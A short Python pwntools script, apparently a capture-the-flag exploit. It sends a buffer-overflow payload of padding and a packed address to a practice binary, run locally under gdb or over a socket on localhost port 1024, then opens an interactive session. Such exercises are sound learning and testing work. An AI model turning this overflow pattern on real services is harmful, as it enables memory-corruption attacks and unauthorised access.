#!/usr/bin/env python3

from pwn import *

def conn():
    if args.LOCAL:
        exe = ELF("./a.out")
        context.binary = exe
        r = gdb.debug([exe.path],
"""
b *main+203
c
""")

    else:
        r = remote("localhost", 1024)

    return r


def main():
    r = conn()

    payload = b'ABCD' + b'A' * 22 + p64(0x04774cc00000000)
    print(len(payload))

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
